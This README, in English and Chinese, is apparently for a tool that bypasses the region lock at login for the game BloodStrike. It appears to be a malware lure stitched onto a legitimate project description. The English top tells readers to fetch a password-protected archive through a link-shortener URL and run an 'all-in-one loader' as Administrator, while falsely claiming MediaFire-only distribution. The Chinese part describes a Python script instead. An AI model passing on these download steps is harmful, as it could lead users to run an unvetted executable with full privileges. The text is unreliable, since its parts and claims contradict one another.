<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://linkolla.com/2474b9">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## 📖 工具介绍

针对游戏 BloodStrike（译名：血战突袭）PC端登录时提示「由于地区限制暂时无法登录」的解决补丁工具，一个非常简易的 IP 地区检测绕过工具。

游戏内实测在大陆内陆地区裸连亚服仅 40ms 左右延迟，可解决进游戏必须挂加速器的问题。

本补丁工具只涉及登录时的网络请求，不构成任何作弊行为，正常使用**不会造成封禁**。

## 🚩 使用方式

按实际情况选择：

- **有 Python 环境**：直接下载 `BloodStrikePatcher.py` 并自行运行
## ✨ 主要原理

0. 因BLOODSTRIKE整个游戏流程里只有登录时有地区检测，后续断开加速器后仍能正常游玩，所以制作了此工具
## 🚀 环境要求

- Windows
- Python 3.8+

## 🔧 更新日志

### v0.1.0

- **文件夹名不区分大小写** — 不再强制要求 `BLOODSTRIKE` 全大写，自动匹配 `BLOODSTRIKE`、`bloodstrike` 等大小写形式
- **添加官网版本的支持** — 同时查找Steam端的 `NtUniSdkSteam.dll` 和官网Win端的 `NtUniSdkMpayOversea.dll`，自动定位存在的那个
- **文件夹名校验优化** — 当文件夹名不匹配时弹出确认窗口，允许用户选择「仍然继续」。用于官网版安装时重命名过游戏文件夹的用户
- **界面翻新** — 采用浅灰背景 + 白色卡片布局，蓝色 / 红色主题色，Windows 原生主题控件，整体更美观
- **可点击 GitHub 链接** — 界面中的仓库地址支持点击跳转浏览器

### v0.0.1

- 首次发布
- 简易的UI页面
- 仅对Steam端的支持


## ⚠️ 免责声明

- 本程序仅供 **个人学习、技术交流**，禁止用于商业用途
- 因使用本程序导致的任何法律纠纷或损失，**由使用者自行承担**


---

                    GNU AFFERO GENERAL PUBLIC LICENSE
                       Version 3, 19 November 2007
